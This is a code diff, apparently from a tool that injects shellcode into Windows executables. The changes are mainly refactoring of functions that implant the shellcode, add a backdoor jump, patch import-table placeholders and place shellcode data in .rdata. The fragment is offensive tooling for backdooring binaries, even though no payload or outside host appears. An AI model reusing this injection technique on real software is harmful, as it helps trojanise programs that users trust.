@@ -47,7 +47,7 @@ def inject_exe(
     # verify and log
     shellcode = file_readall_binary(shellcode_in)
     shellcode_len = len(shellcode)
-    code = extract_code_from_exe(exe_out)
+    code = extract_code_from_exe_file(exe_out)
     in_code = code[peinj.shellcodeOffsetRel:peinj.shellcodeOffsetRel+shellcode_len]
     jmp_code = code[peinj.backdoorOffsetRel:peinj.backdoorOffsetRel+12]
     if config.debug:
@@ -58,11 +58,8 @@ def inject_exe(
 
 
 def injected_fix_iat(exe_out: FilePath, carrier: Carrier, exe_host: ExeHost):
-    """replace IAT in shellcode in code and re-implant it"""
-
-    # get code section of exe_out
-    code = extract_code_from_exe(exe_out)
-
+    """replace IAT-placeholders in shellcode with call's to the IAT"""
+    code = extract_code_from_exe_file(exe_out)
     for iatRequest in carrier.get_all_iat_requests():
         if not iatRequest.placeholder in code:
             raise Exception("IatResolve ID {} not found, abort".format(iatRequest.placeholder))
@@ -85,6 +82,7 @@ def injected_fix_iat(exe_out: FilePath, carrier: Carrier, exe_host: ExeHost):
 
 
 def injected_fix_data(exe_path, carrier: Carrier, exe_host: ExeHost):
+    """Inject shellcode-data into .rdata and replace reusedata_fixup placeholders in code with LEA"""
     # Insert my data into the .rdata section.
     # Chose and save each datareuse_fixup's addres.
     reusedata_fixups: List[DataReuseEntry] = carrier.get_all_reusedata_fixups()
@@ -93,8 +91,8 @@ def injected_fix_data(exe_path, carrier: Carrier, exe_host: ExeHost):
     with open(exe_path, "r+b") as f:
         for datareuse_fixup in reusedata_fixups:
             var_data = datareuse_fixup.data
-            print("    Addr: {} / 0x{:X}  Data: {}".format(
-                addr, addr, len(var_data)))
+            #print("    Addr: {} / 0x{:X}  Data: {}".format(
+            #    addr, addr, len(var_data)))
             f.seek(addr)
             f.write(var_data)
             datareuse_fixup.addr = addr + sect.virt_addr + exe_host.image_base - sect.raw_addr
@@ -102,7 +100,7 @@ def injected_fix_data(exe_path, carrier: Carrier, exe_host: ExeHost):
 
     # patch code section
     # replace the placeholder with a LEA instruction to the data we written above
-    code = extract_code_from_exe(exe_path)
+    code = extract_code_from_exe_file(exe_path)
     for datareuse_fixup in reusedata_fixups:
         if not datareuse_fixup.randbytes in code:
             raise Exception("DataResuse: ID {} not found, abort".format(
@@ -111,7 +109,7 @@ def injected_fix_data(exe_path, carrier: Carrier, exe_host: ExeHost):
         offset_from_datasection = code.index(datareuse_fixup.randbytes)
         instruction_virtual_address = offset_from_datasection + exe_host.image_base + exe_host.code_virtaddr
         destination_virtual_address = datareuse_fixup.addr
-        logger.info("    Replace {} at VA 0x{:x} with call to IAT at VA 0x{:x}".format(
+        logger.info("    Replace {} at VA 0x{:x} with .rdata LEA at VA 0x{:x}".format(
             datareuse_fixup.randbytes, instruction_virtual_address, destination_virtual_address
         ))
         lea = assemble_lea(
